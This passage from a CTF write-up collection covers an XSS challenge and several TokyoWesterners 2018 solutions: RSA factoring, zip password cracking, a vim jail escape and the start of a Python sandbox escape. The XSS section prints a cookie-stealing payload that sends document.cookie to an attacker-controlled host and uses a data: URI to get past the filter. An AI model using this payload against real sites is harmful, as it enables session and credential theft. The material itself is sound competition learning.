URL!\"}\n\nIf we put in a valid URL, such as the URL of the website itself however (`http://13.57.104.34/`), we get:\n\n    {\"msg\": \"ok\"}\n\n(Note that any valid URL works, but we need to use this website since this is a cookie-stealing XSS attack.)\n\nSo the structure of this challenge is very similar to that of [Excesss (SecurityFest 2018)](https://github.com/Aurel300/empirectf/blob/master/writeups/2018-05-31-SecurityFest/README.md#51-web--excesss). What can we actually do with the website? The crucial code is this:\n\n    function lls(src) {\n        var el = document.createElement('script');\n        if (el) {\n            el.setAttribute('type', 'text/javascript');\n            el.src = src;\n            document.body.appendChild(el);\n        }\n    };\n\n    function lce(doc, def, parent) {\n        var el = null;\n        if (typeof doc.createElementNS != \"undefined\") el = doc.createElementNS(\"http://www.w3.org/1999/xhtml\", def[0]);\n        else if (typeof doc.createElement != \"undefined\") el = doc.createElement(def[0]);\n\n        if (!el) return false;\n\n        for (var i = 1; i\n        < def.length; i++) el.setAttribute(def[i++], def[i]);\n        if (parent) parent.appendChild(el);\n        return el;\n    };\n    window.addEventListener('message', function (e) {\n        if (e.data.iframe) {\n            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf(\"//\") == -1 && e.data.iframe.value.indexOf(\"。\") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {\n                if (e.data.iframe.type == \"iframe\") {\n                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);\n                } else {\n                    lls(e.data.iframe.value)\n                }\n            }\n        }\n    }, false);\n    window.onload = function (ev) {\n        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')\n    }\n\nWhen the `window` loads, it posts a message containing the part of the URL after the `?` character, decoded as JSON, to any (`*`) origin. This message is immediately caught by the `message` listener defined above.\n\nIn the listener, the function checks that an `iframe` property is defined on the decoded JSON object, and then a bunch more checks:\n\n - `e.data.iframe` - duplicate check for the `iframe` property (?)\n - `e.data.iframe.value.indexOf('.') == -1` - the `value` property cannot contain the `.` character\n - `e.data.iframe.value.indexOf(\"//\") == -1` - the `value` property cannot contain the `//` substring\n - `e.data.iframe.value.indexOf(\"。\") == -1` - the `value` property cannot contain the `。` character\n - `e.data.iframe.value` - check for the `value` property on `iframe`\n - `typeof(e.data.iframe != 'object')` - this one is a little misleading; it does not assert that the type of `iframe` is not `object`, instead it checks the type of the expression `e.data.iframe != 'object'` (which will always be true unless we give it the literal string `object`), and this type will always be `\"boolean\"`, which will not cause the condition to fail since a string is a truthy value\n\nIf we can pass these conditions, the value we provided is either used as the `src` for an `<iframe>` or as an `src` for a `<script>`. I'm not sure how well an `<iframe>` would work since we are stealing cookies and all, but more importantly, this line:\n\n    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);\n\nSeems to always trigger an error, at least when testing locally, since neither `doc` nor `parent` are defined, but are used inside the `lce` function. Bit weird.\n\nSo instead, we use the `<script>` option. To summarise, we can basically create a `<script>` tag on the target user's website with any `src` we choose, but it cannot contain `.` or `//`, so a full URL should not really work.\n\nNote: I did not realise during the CTF, but there are at least two other ways to circumvent the condition apart from not using `.` or `//`:\n - supply the `value` as an array (then `value.indexOf` checks for elements inside the array, not substrings in a string), which will then get turned into a string automatically\n - use some backslash quirkiness in URL parsing, e.g. `http:/\\1234/` still works in some browsers\n\nDuring the CTF I found a way to provide a malicious script without using `.` or `//`, however.\n\nThe method I used was the [`data://` scheme](https://en.wikipedia.org/wiki/Data_URI_scheme). It allows specifying the full content of a file as well as its `Content-Type` as a URI, e.g. \n\n    data:text/html,<i>hello</i> <b>world</b>\n\nIs an extremely simple HTML document that can be used as a [link](data:text/html,<i>hello</i> <b>world</b>). This scheme can also be used for binary data by adding `;base64` to the `Content-Type`, then encoding the bytes of the data with the Base64 encoding. Using this technique, we can provide arbitrary JavaScript content.\n\nOur informed guess is that the flag will be in the user's cookies, so we want our script to make a request to a website we control and provide the cookies. We have to do this since the website itself only says `{\"msg\": \"ok\"}` and provides no way to see what actually happened when our victim loaded our XSS attack. So, here is our payload:\n\n    window.location='http://<IP we control>:1337/'+document.cookie\n\nWe can encode this and wrap it in the JSON structure required by the challenge:\n\n    const payload = `window.location='http://<IP we control>:1337/'+document.cookie`\n         ,b64 = Buffer.from(payload).toString('base64')\n         ,wrap = `{\"iframe\":{\"type\":\"script\",\"value\":\"data:text/javascript;base64,${b64}\"}}`\n         ,url = `http://13.57.104.34/?${encodeURIComponent(wrap)}`;\n    console.log(url);\n\nThen:\n\n    $ node make.js\n    http://13.57.104.34/?%7B%22iframe%22%3A%7B%22type%22%3A%22script%22%2C%22value%22%3A%22data%3Atext%2Fjavascript%3Bbase64%2Cd2luZG93LmxvY2F0aW9uPSdodHRwOi8vYXJlbnQteW91LWN1cmlvLnVzOjEzMzcvJytkb2N1bWVudC5jb29raWU%3D%22%7D%7D\n\nNow on the <IP we control>, we listen for packets:\n\n    $ nc -l -p 1337\n\nFinally, we provide the generated URL to the website and sure enough, we get the cookies:\n\n    GET /flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,* /*;q=0.8\n    Referer: http://127.0.0.1/?%7B%22iframe%22%3A%7B%22type%22%3A%22script%22%2C%22value%22%3A%22data%3Atext%2Fjavascript%3Bbase64%2Cd2luZG93LmxvY2F0aW9uPSdodHRwOi8vYXJlbnQteW91LWN1cmlvLnVzOjEzMzcvJytkb2N1bWVudC5jb29raWU%3D%22%7D%7D\n    User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1\n    Connection: Keep-Alive\n    Accept-Encoding: gzip, deflate\n    Accept-Language: en,*\n    Host: <IP we control>:1337\n\n`rwctf{L00kI5TheFlo9}`\n", "timestamp": "2025-10-24T11:39:04.314541"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-09-01-TokyoWesterners-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-01-TokyoWesterners-CTF/README.md", "content": "# 2018-09-01-TokyoWesterners-CTF #\n\n[CTFTime link](https://ctftime.org/event/651) | [Website](https://tokyowesterns.github.io/ctf2018/)\n\n---\n\n## Challenges ##\n\n### Crypto ###\n\n - [x] [112 scs7](#112-crypto--scs7)\n - [x] [154 Revolutional Secure Angou](#154-crypto--revolutional-secure-angou)\n - [ ] 233 mixed cipher\n\n### Misc ###\n\n - [x] [95 mondai.zip](#95-misc--mondaizip)\n - [x] [126 vimshell](#126-misc--vimshell)\n - [x] [121 + 126 pysandbox](#121--126-misc--pysandbox)\n\n### Pwnable ###\n\n - [ ] 208 load\n - [ ] 447 BBQ\n - [ ] 240 + 300 + 300 EscapeMe\n - [x] [239 Neighbor C](#239-pwnable--neighbor-c)\n - [x] [233 swap Returns](#233-pwnable--swap-returns)\n - [ ] 421 twgc\n - [ ] 410 ReadableKernelModule\n - [ ] 90 BBQ-old\n\n### Reversing ###\n\n - [x] [99 dec dec dec](#99-reversing--dec-dec-dec)\n - [ ] 315 tw playing card\n - [ ] 462 Matrix LED\n - [ ] 462 DartS\n - [ ] 447 REVersiNG\n\n### Warmup ##\n\n- [x] [28 Welcome!!](#28-warmup--welcome)\n\n### Web ###\n\n - [x] [55 SimpleAuth](#55-web--simpleauth)\n - [x] [190 shrine](#190-web--shrine)\n - [ ] 267 Slack emoji converter\n\n---\n\n## 112 Crypto / scs7 ##\n\n**Description**\n\n> `nc crypto.chal.ctf.westerns.tokyo 14791`\n> \n> Note: You can encrypt up to 100 messages \"per once connection\".\n\n**No files provided**\n\n**Solution**\n\nUpon connecting, we get the encrypted flag with some random \"key\" and we can encrypt 100 messages with the same \"key\". On each connection, the encrypted flag is different, but of course the decrypted plain text is always the same.\n\n    $ nc crypto.chal.ctf.westerns.tokyo 14791\n    encrypted flag: XRSAVJb0UiLYkm44anypH4JkKZgNGTabbj7mABkztEDvDrKT1fRpfS6vtwzaDf24\n    You can encrypt up to 100 messages.\n    message: \n\nThe characters look very much like the Base-64 alphabet, and the number of characters in the output grows slightly faster than the length of the input. The padding characters are removed.\n\nWe can find the correct flag length by matching the Base-64 character amount:\n\n    . nc crypto.chal.ctf.westerns.tokyo 14791\n    encrypted flag: 03swHpYeLkJnm8aaE1rfMapmU6ZBAtEYYzC8w5mjWKoioRUtPx3fxsciWqjEoxba\n    You can encrypt up to 100 messages.\n    message: TWCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\n    ciphertext: 03swHpYeFR6FMLnQn6jwPa86kus9TbcBHsaGy99oySVvH9Zg1KkcKBrUTsENJ8mG\n    message: TWCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxy}\n    ciphertext: LLVePvv77RHm0UBQ7FzwCv8SSR391yaCnttssP1XdJGk9NDgPZeKWpBrAnUaaEirZs\n\nHere we can make an important observation – the Base-64 characters are jumbled using some cipher that doesn't always produce the same output for the same input, i.e. it is position-dependent. Additionally, the `TWCTF{` prefix matched only when the length of the entire plain text matched, so it seems the message length is a parameter of the cipher.\n\nThis *could* be something like a simple affine cipher. Nonetheless, during the CTF I wrote a simple brute-force script matching one prefix at a time.\n\n([Full script](scripts/SCS7.hx))\n\n`TWCTF{67ced5346146c105075443add26fd7efd72763dd}`\n\n## 154 Crypto / Revolutional Secure Angou ##\n\n**No description**\n\n**Files provided**\n\n - [`revolutional-secure-angou.7z`](files/revolutional-secure-angou.7z) containing:\n   - `flag.encrypted`\n   - `generator.rb`\n   - `publickey.pem`\n\n**Solution**\n\nFirst a look at all the files provided:\n\n    $ xxd flag.encrypted\n    0000000: 4fed 3772 79db 2e48 b1e8 5fa3 572d bf5d  O.7ry..H.._.W-.]\n    0000010: 2fa2 6a7c d109 37a2 86b3 a34f c66c 13e3  /.j|..7....O.l..\n    0000020: d0bc af0a 9d33 ce30 4202 e9a4 e986 fb12  .....3.0B.......\n    0000030: bf86 d761 0506 649a 536d 7113 1563 87fa  ...a..d.Smq..c..\n    0000040: aca5 ce56 0c3c d213 7de8 07d7 7ca5 dc30  ...V.<..}...|..0\n    0000050: fd6f a3dd c794 908b e230 1ba9 bb86 04f6  .o.......0......\n    0000060: c03e b484 7ff5 e723 d81e 4273 1bb7 2d8c  .>.....#..Bs..-.\n    0000070: 2646 d2a9 e203 2642 aa51 28a9 cd5c 6a4b  &F....&B.Q(..\\jK\n    0000080: d75b 0e3e 2322 fb7a c63d dc09 c9ca d257  .[.>#\".z.=.....W\n    0000090: 3cf2 b1e1 af79 74ea d8d7 00b8 26bb c7b3  <....yt.....&...\n    00000a0: 16e8 ba24 0ebb d2a6 5e13 faa6 8f18 cec0  ...$....^.......\n    00000b0: 5d35 463d a9b5 09c3 9b8e 5090 d91b 1316  ]5F=......P.....\n    00000c0: 3fc3 d99e c33d f350 1e81 89fc d3b7 1fc1  ?....=.P........\n    00000d0: fa1a b075 cb29 f66a 64da cab5 19b7 a29c  ...u.).jd.......\n    00000e0: 0171 306b edbe 5841 7613 6b57 6e47 27a9  .q0k..XAv.kWnG'.\n    00000f0: 8054 c68e 4285 fa1f 0e98 0b99 57ed b9a4  .T..B.......W...\n\n    $ cat generator.rb\n\n```ruby\nrequire 'openssl'\n\ne = 65537\nwhile true\n  p = OpenSSL::BN.generate_prime(1024, false)\n  q = OpenSSL::BN.new(e).mod_inverse(p)\n  next unless q.prime?\n  key = OpenSSL::PKey::RSA.new\n  key.set_key(p.to_i * q.to_i, e, nil)\n  File.write('publickey.pem', key.to_pem)\n  File.binwrite('flag.encrypted', key.public_encrypt(File.binread('flag')))\n  break\nend\n```\n\n    $ openssl rsa -in publickey.pem -pubin -text -noout\n    Public-Key: (2048 bit)\n    Modulus:\n        00:85:29:06:3e:a0:ad:3b:46:29:6f:92:f7:23:56:\n        77:2e:a4:e7:03:f7:b7:92:20:c1:8d:e1:b7:e3:ca:\n        0a:77:28:d1:9e:69:dc:48:b8:68:5c:d6:04:f5:88:\n        7a:4f:8f:3a:94:5a:1c:a1:59:3c:f0:86:d3:48:ec:\n        4d:c9:21:42:08:3f:c9:e2:20:3c:65:30:31:1e:e5:\n        10:be:50:a4:2a:ee:4a:63:e7:fa:66:bf:ce:35:12:\n        fc:2f:b1:17:40:2a:55:cd:f0:89:77:70:c1:bb:86:\n        f2:d9:30:6d:a5:b8:99:d2:94:ed:bc:b1:7a:d8:7e:\n        17:59:2c:cc:3f:62:b1:30:57:24:18:17:32:ac:74:\n        74:cf:23:be:b7:22:83:33:73:ef:07:b6:a9:21:88:\n        cf:28:bc:fe:f2:6b:23:68:ad:a3:8f:7f:4f:d8:92:\n        1d:be:3b:64:88:e4:b9:20:28:ff:bd:46:ae:26:d8:\n        b4:3c:9a:86:db:bc:63:f0:b5:13:98:bb:54:09:8f:\n        f7:00:4b:64:6a:fb:42:f2:43:54:ab:6a:2d:30:ef:\n        ee:e8:b3:33:47:3a:be:1c:c9:2e:b6:8a:46:58:19:\n        d9:e9:a0:ff:58:fe:af:2c:72:2a:e6:5b:7c:ed:c9:\n        e3:0b:e9:15:02:9d:69:34:25:23:b9:81:ad:83:95:\n        cd:f7\n    Exponent: 65537 (0x10001)\n\nSo the Ruby script was used to encrypt the flag using RSA. We are given the encrypted cipher text and the 2048-bit public key. 2048-bit RSA key sounds serious and such keys are still used for secure applications nowadays. So the only conclusion we can come to is that the key is not generated properly.\n\nFactorisation with yafu was attempted but yielded no results, so it seems that the factors are still quite large.\n\nInstead, let's have a closer look at how the primes are actually generated:\n\n```ruby\nwhile true\n  p = OpenSSL::BN.generate_prime(1024, false)\n  # q is modular inverse of e mod p\n  q = OpenSSL::BN.new(e).mod_inverse(p)\n  next unless q.prime?\n```\n\nThe [library](https://ruby-doc.org/stdlib-2.5.1/libdoc/openssl/rdoc/OpenSSL/BN.html) used to generate `p` seems a completely valid choice. The second argument of `generate_prime` specifies whether the generated prime should be a [\"safe prime\"](https://en.wikipedia.org/wiki/Safe_prime), but even though the prime generated is \"unsafe\" it is still a 1024-bit prime.\n\nBut the unusual bit here is how `q` is obtained. It is the [modular multiplicative inverse](https://en.wikipedia.org/wiki/Modular_multiplicative_inverse) of `e` (the public modulus) `mod p`? Key generation in RSA usually consists of generating two discting primes indepently of one another, and repeating the process until there are only very small common factors between `(p - 1)` and `(q - 1)`. Here `q` clearly depends on `p`!\n\nBut how can we exploit this? Let's write down what we know and do some algebraic manipulation:\n\n    e = 65537\n    p ... 1024-bit prime, \"unsafe\"\n    q = e^-1 mod p\n     => e * q = 1 mod p\n     => e * q = 1 + x * p, for some integer x ≥ 0\n     => x * p = e * q - 1\n     => p = (e * q - 1) / x\n    n ... 2048-bit public key\n    q ... ~1024-bit prime (since n = p * q is 2048-bit)\n    n = p * q\n     => n = ((e * q - 1) / x) * q\n     => n = (e * q^2 - q) / x\n\nWe can actually rewrite that last line as a quadtratic polynomial:\n\n        n = (e * q^2 - q) / x\n    x * n = e * q^2 - q\n        0 = e * q^2 - q - x * n\n\nWhere `a = e`, `b = -1`, and `c = x * n`. Now we can simply use the quadratic formula to find the roots, i.e. the solutions for `q`. Of course, we only need to consider the positive root:\n\n    q = (-b + sqrt(b^2 - 4ac)) / 2a\n    substituting:\n    q = (1 + sqrt(1 - 4 * e * x * n)) / 2e\n\nWe know that `q` is a 1024-bit prime number, so clearly it has to be an integer. For the fraction to be an integer, we need the denominator (`1 + sqrt(...)`) to be divisible by `2e`. More importantly, since `2e` is an integer, we need the denominator to be an integer, and hence we need the discriminant (`b^2 - 4ac = 1 - 4 * e * x * n`) to be a perfect square. We know `n` and `e`, since these form the public key. The only unknown here is `x`.\n\nWe expect `x` to be somewhat close in value to `e`, in order for the square root of the discriminant `+ 1` to be divisible by `2e`. However, since `e = 65537`, we can simply do an exhaustive search from `x = 1` until we find a solution. Here is a simple Python script to do this using gmpy2 (native Python integers are too slow here):\n\n```python3\nn = gmpy2.mpz(0x008529063ea0ad3b46296f92f72356772ea4e703f7b79220c18de1b7e3ca0a7728d19e69dc48b8685cd604f5887a4f8f3a945a1ca1593cf086d348ec4dc92142083fc9e2203c6530311ee510be50a42aee4a63e7fa66bfce3512fc2fb117402a55cdf0897770c1bb86f2d9306da5b899d294edbcb17ad87e17592ccc3f62b1305724181732ac7474cf23beb722833373ef07b6a92188cf28bcfef26b2368ada38f7f4fd8921dbe3b6488e4b92028ffbd46ae26d8b43c9a86dbbc63f0b51398bb54098ff7004b646afb42f24354ab6a2d30efeee8b333473abe1cc92eb68a465819d9e9a0ff58feaf2c722ae65b7cedc9e30be915029d69342523b981ad8395cdf7)\ne = gmpy2.mpz(0x10001)\n\nfor x in range(1, 0x100000):\n  discriminant = gmpy2.mpz(1 + 4 * n * e * x)\n  root = gmpy2.iroot(discriminant, 2)[0]\n  if root * root == discriminant:\n    print(x)\n    break\n```\n\nAnd with that we quickly find `x = 54080`. We can confirm that it is now possible to find an exact integer solution to the quadratic formula:\n\n```python3\nnumerator = 1 + gmpy2.iroot(gmpy2.mpz(1 + 4 * n * e * x), 2)[0]\ndenominator = 2 * e\nprint(numerator % denominator == 0)\nq = numerator // denominator\n```\n\nAnd finally to verify that `q` divides `n` eactly:\n\n```python3\nprint(n % q == 0)\np = n // q\n```\n\nSo with the knowledge of the primes, we can proceed with the RSA auto-pilot of calculating the totient, the private key `d`, and decrypting the message. (Full script here)[scripts/rsa.py].\n\n    $ python3 rsa.py\n    x = 54080\n    integer fraction found: True\n    prime of n found: True\n    p = 142727552290123521017279182847387099553980176436653156686571005621360593567236973858972940588412513104338972342496604878974964273707518226570604980944855067127507753049804700855693115963197456876865788199179854448882972688495369967044453040443306336140280352904742571391288666823388345281672776486027914172087\n    q = 117776309990537864360810812340917258096636219871129327152749744175094693075913995854147376703562090249517854407162616412941789644355136574651545193852293544566513866746012759544621873312628262933928953504305148673201262843795559879423287920215664535429854303448257904097546288383796049755601625835244054479553\n    phi = 16809924442712290290403972268146404729136337398387543585587922385691232205208904952456166894756423463681417301476531768597525526095592145907599331332888256802856883222089636138597763209373618772218321592840374842334044137335907260797472710869521753591357268215122104298868917562185292900513866206744431640041825979867105249932890940911381335041712272797899543995788514582462240518842563155246865613570402920157419687697111930148710870730629815957216849373343577492188501906664815472358533861143958926638396113416061578785068164481601201983962622457263781854341614203973944361678592735864122145283939434822573696185472\n    d = 12685738484942314313789152088713015321019042297472437411782771035468772791022201521866687554829534334295978407562541895590222583725770119967316900820330308145867154895678917621233321220214541972265647639328917389446528753900228898248644358670442755834434712778789218829263758255497813697203332390148558830175147310866644665626759237615318035132719007400987467338201448864296771161037512985522673902009017617912715914889661745903763404559187778470360726556095437014337838584308534776262391743663242452258751468290150198568013508078353178322517408204393733661168920690604442379722902170230064742991792065054165583806721\n    cipher = 10089801952851677233375343748334663831040141607106889530909669540017317755681188698980263004402133660979407119311320372745257158691631249131566106670161865093087801278950198225102042583803531958252306524156922426585194114960337939249290950354517240715367558712098747715093640298873767081261430898770019892466124065148096497855157363209509475161543099156564224121940010336176009687669790607339053418086863051500818439084834826453968837826083502290458386468079753695372281967619869947082478955556210036493908924005620167220729452963493214730708944132474924039805244831072055444725447859972247018254615246641130491460004\n    plain = 1420601612258441926906969731437774688566600890964306449231629993551702380099505967631945399642414315403811583561535034439099347713042568688699687261390828335560089515851235597692036443716875019777612882313897487635097134956465952548138454303501409485681689290099638892995732756381973242435538753053322905709330700680463397820462905451695207786668795318920215889953844197054766418474627615281614803885642272992371082587560442350258729933763385621651053463385604854287725833254781960311919433904258481720918081195804122887612881112805428762497246317821976323018012958859174791513792343656717981507896162640601644298\n    b'\\x02\\xe1\\x7f\\x96\\xcba\\xf0\\xe17\\xa2(t{E\\xea\\x96U\\xb9\\xf5\\xd2D5\\x0bL\\xee\\xdeq{\\xdd\\x9d\\x82o\\xd1\\xd6\\xfe`\\xa2\\xc62B\\x8c\\x9a\\xd6}\\xa6\\xc8X\\xa3>4\\x98oN\\xc0\\xd6I\\xf4zn_\\xe3\\x90\\x18B\\xff\"\\xf6\\xcf\\x94\\xdb\\x13;\\x83s\\xff\\xde\\xf0\\x13\\xb1<-\\xd9(p\\xce\\x86\\x88f6\\x12\\x03\\xa00n\\x06;YbRH\\xda\\xbe\\x0bo!\\x0e-\\xa1\\x13\\x07\\x89\\x18\\xb53}T\\x92\\xe6H\\xf7\\x19\\xd3E#R5HTe#9\\'@\\xeb\\xff\\x91#`\\x8cv\\x19\\xaa \\x04Z\\xcc\\x95,\\x0e\\xfb\\xdf\\xb8$\\x96>(%\\'\\xba\\xef\\xeb\\x15\\x8d\\x860wt|\\xfbr\\xf5eA\\x9b\\xaf\\x1aa\\xf0q\\x9d\\xa8\\x82\\xe9r\\xd9\\xe0\\xab\\xe2\\x93\\xd1\\x97\\x80\\x9c\\xca\\xcd\\x8dx\\x16\\xdb\\xee\\xcb\\x05\\xc3\\x12\\x15@\\x00TWCTF{9c10a83c122a9adfe6586f498655016d3267f195}\\n'\n\n(The message is padded and the actual flag is at the very end.)\n\n`TWCTF{9c10a83c122a9adfe6586f498655016d3267f195}`\n\n## 95 Misc / mondai.zip ##\n\n**No description**\n\n**Files provided**\n\n - [`mondai.zip`](files/mondai.zip) containing:\n   - `y0k0s0.zip`\n\n**Solution**\n\nClassic Matryoshka-doll-type problem.\n\n    $ unzip mondai.zip\n    Archive:  mondai.zip\n     extracting: y0k0s0.zip\n    $ zipinfo y0k0s0.zip\n    Archive:  y0k0s0.zip   9923 bytes   2 files\n    -rw-a--     6.3 fat     3948 Bx defN 31-Aug-18 22:26 capture.pcapng\n    -rw-a--     6.3 fat     8677 Bx defN  1-Sep-18 03:29 mondai.zip\n    2 files, 12625 bytes uncompressed, 9605 bytes compressed:  23.9%\n\n`y0k0s0.zip` contains another `mondai.zip`, so we specify an output directory in order not to override the file. The file is password protected - since it is called `y0k0s0`, which is a weird word / name, let's try that:\n\n    $ unzip y0k0s0.zip -d level1\n    Archive:  y0k0s0.zip\n    [y0k0s0.zip] capture.pcapng password: (y0k0s0)\n      inflating: level1/capture.pcapng\n      inflating: level1/mondai.zip\n\nAnd it worked, great. The next level is password-protected again, as are all the following ones. Let's have a look at the `capture.pcapng` file in Wireshark:\n\n![](screens/mondai1.png)\n\nThere are a bunch of ICMP ping packets, some of them getting a reply, some of them not. The `data` field of the requests seems to contain `abc...uvw` repeating, but the length of each packet is different. We can filter the packets to only show the requests (since the responses, if present, always contain the same `data`) that have the `data` field with:\n\n    data && icmp.type == 8\n\n![](screens/mondai2.png)\n\nLet's note the lengths of the packets:\n\n    129, 143, 91, 141, 153, 151, 106, 106, 106, 143, 106, 106, 106\n\nIf we decode these numbers as ASCII, they look like garbage, but these lengths are the lengths of the full packets. Each packet includes some header data before the actual ping payload. Looking at the first packet, the packet size is `129`, while the length of the `data` field is `87`, a difference of `42`. In fact, the header is the same size for all of the packets. Let's decode that as ASCII:\n\n    $ python3\n    >>> bytes(map(lambda n: n - 42, [129, 143, 91, 141, 153, 151, 106, 106, 106, 143, 106, 106, 106]))\n    b'We1com@@@e@@@'\n\nIgnoring the `@` signs (coming from packets with no response in the packet dump), we get `We1come`. And this is the password!\n\n    $ unzip level1/mondai.zip -d level2\n    Archive:  level1/mondai.zip\n    [level1/mondai.zip] list.txt password: (We1come)\n      inflating: level2/list.txt\n      inflating: level2/mondai.zip\n\nFor this level we are given a `list.txt` with a thousand 10-character lines of random-looking ASCII strings. These seem like possible passwords but checking them one-by-one would be a pain, so let's use `fcrackzip`:\n\n    $ fcrackzip -D -p level2/list.txt level2/mondai.zip\n\nWith this we can find the password `eVjbtTpvkU`.\n\n    $ unzip level2/mondai.zip -d level3\n    Archive:  level2/mondai.zip\n    [level2/mondai.zip] 1c9ed78bab3f2d33140cbce7ea223894 password: (eVjbtTpvkU)\n      inflating: level3/1c9ed78bab3f2d33140cbce7ea223894\n    $ xxd level3/1c9ed78bab3f2d33140cbce7ea223894\n    0000000: 504b 0304 1400 0100 0800 4d19 214d acc3  PK........M.!M..\n    0000010: 5247 2b01 0000 2a01 0000 0a00 0000 6d6f  RG+...*.......mo\n    0000020: 6e64 6169 2e7a 6970 30fc c34b ee61 96e5  ndai.zip0..K.a..\n    ...\n    0000240: 3b41 d401 085c c9f9 5541 d401 085c c9f9  ;A...\\..UA...\\..\n    0000250: 5541 d401 504b 0506 0000 0000 0200 0200  UA..PK..........\n    0000260: b800 0000 9c01 0000 0000                 ..........\n    $ file level3/1c9ed78bab3f2d33140cbce7ea223894\n    level3/1c9ed78bab3f2d33140cbce7ea223894: Zip archive data, at least v2.0 to extract\n\nNo hint this time except the filename itself. It is 32 characters and hexadecimal, so we can try to check if it is a known hash. And indeed, crackstation reports this as a known MD-5 hash of `happyhappyhappy`.\n\n    $ unzip level3/1c9ed78bab3f2d33140cbce7ea223894 -d level4\n    Archive:  level3/1c9ed78bab3f2d33140cbce7ea223894\n    [level3/1c9ed78bab3f2d33140cbce7ea223894] mondai.zip password: (happyhappyhappy)\n      inflating: level4/mondai.zip\n     extracting: level4/README.txt\n\nThe `README.txt` says `password is too short`, so presumably we can crack this with `fcrackzip` bruteforce.\n\n    $ fcrackzip -b -l 2 level4/mondai.zip\n\nThere are no 1-character password matches, but there are several 2-character matches – perhaps the `too short` in the hint was a play on `two short`? `fcrackzip` for some reason cannot verify these matches very well (which is what the `-u` option should do), but there are not too many, so we can test them one-by-one. The correct password is `to`.\n\n    $ unzip level4/mondai.zip -d level5\n    Archive:  level4/mondai.zip\n    [level4/mondai.zip] secret.txt password: (to)\n      inflating: level5/secret.txt\n    $ cat level5/secret.txt\n    Congratulation!\n    You got my secret!\n    \n    Please replace as follows:\n    (1) = first password\n    (2) = second password\n    (3) = third password\n    ...\n    \n    TWCTF{(2)_(5)_(1)_(4)_(3)}\n\n`TWCTF{We1come_to_y0k0s0_happyhappyhappy_eVjbtTpvkU}`\n\n## 126 Misc / vimshell ##\n\n**Description**\n\n> Can you escape from [jail](http://vimshell.chal.ctf.westerns.tokyo/)?\n\n**No files given**\n\n**Solution**\n\nOn the website, we get thrown into a vim session which shows:\n\n    diff --git a/src/normal.c b/src/normal.c\n    index 41c762332..0011afb77 100644\n    --- a/src/normal.c\n    +++ b/src/normal.c\n    @@ -274,7 +274,7 @@ static const struct nv_cmd\n         {'7',      nv_ignore,      0,                      0},\n         {'8',      nv_ignore,      0,                      0},\n         {'9',      nv_ignore,      0,                      0},\n    -    {':',      nv_colon,       0,                      0},\n    +    // {':',   nv_colon,       0,                      0},\n         {';',      nv_csearch,     0,                      FALSE},\n         {'<',      nv_operator,    NV_RL,                  0},\n         {'=',      nv_operator,    0,                      0},\n    @@ -297,7 +297,7 @@ static const struct nv_cmd\n         {'N',      nv_next,        0,                      SEARCH_REV},\n         {'O',      nv_open,        0,                      0},\n         {'P',      nv_put,         0,                      0},\n    -    {'Q',      nv_exmode,      NV_NCW,                 0},\n    +    // {'Q',   nv_exmode,      NV_NCW,                 0},\n         {'R',      nv_Replace,     0,                      FALSE},\n         {'S',      nv_subst,       NV_KEEPREG,             0},\n         {'T',      nv_csearch,     NV_NCH_ALW|NV_LANG,     BACKWARD},\n    @@ -318,7 +318,7 @@ static const struct nv_cmd\n         {'d',      nv_operator,    0,                      0},\n         {'e',      nv_wordcmd,     0,                      FALSE},\n         {'f',      nv_csearch,     NV_NCH_ALW|NV_LANG,     FORWARD},\n    -    {'g',      nv_g_cmd,       NV_NCH_ALW,             FALSE},\n    +    // {'g',   nv_g_cmd,       NV_NCH_ALW,             FALSE},\n         {'h',      nv_left,        NV_RL,                  0},\n         {'i',      nv_edit,        NV_NCH,                 0},\n         {'j',      nv_down,        0,                      FALSE},\n    ~\n    ~\n    \"/vimshell.patch\" [readonly] 31 lines, 1124 characters\n\nThe patch file seems to show a modification of `vim` source code. The `:`, `Q` and `g` keys are not bound properly, so we cannot simply do `<esc>:q!` to quit. Apart from that, we can try `<esc>ZZ` but this actually closes our connection, instead of exiting `vim`. So in effect this challenge is like an SSH jail with the remote shell set to modified `vim`. Our goal is to get the flag somehow, not to quit `vim`.\n\nAfter playing around a bit, we can see that writing into the file is possible, although it warns us that it is open in read-only mode. So we cannot save, but we can write anything and keep it in our session. The fact that `g` is disabled gives us another hint: we can \"go to file\" with the keystroke `gf`. This opens the filename that is currently under the cursor.\n\nLooking around a bit more, I found [this page](http://vim.wikia.com/wiki/Open_file_under_cursor), which shows the `gf` keystroke, but additionally `<c-w>f` and `<c-w>gf`. So we write `flag` into the file using insert mode (`<esc>i`), then `<esc>` to switch to normal mode and finally `<c-w>f` to open the `flag` file in another window.\n\n`TWCTF{the_man_with_the_vim}`\n\n## 121 + 126 Misc / pysandbox ##\n\n**Description**\n\n> let's break [sandbox](files/sandbox.py).\n> \n> start from nc pwn1.chal.ctf.westerns.tokyo 30001\n> \n> Update(2018-09-01 10:22 UTC):\n> \n> slightly patched sandbox.py to avoid netcat issues.\n> \n>     81c81\n>     <     expr = sys.stdin.read()\n>     ---\n>     >     expr = sys.stdin.readline()\n\n**Files provided**\n\n - [`sandbox.py`](files/sandbox.py)\n - (after solving the first part) [`sandbox2.py`](files/sandbox2.py)\n\n**Solution**\n\nThe script given to us is a simple sandbox which accepts input, lets the Python parser parse it into its AST, does some checking, and executes the input if it is valid. Apparently function calls are not allowed.\n\nSince our goal is to read the `flag` file, it is hard to imagine a script that reads a file without calling any functions. So either we can come up with a way to call functions without using a `Call` in the AST, or we can find some place to hide a `Call` where the checker doesn't look.\n\nKnowing some Python weirdness ahead of time, seeing that lambda expressions are allowed immediately attracted my attention. Why have lambdas when calls are disallowed? The body of the lambda is checked with the checker, so we cannot have a `Call` inside the actual lambda expression.\n\n    $ nc 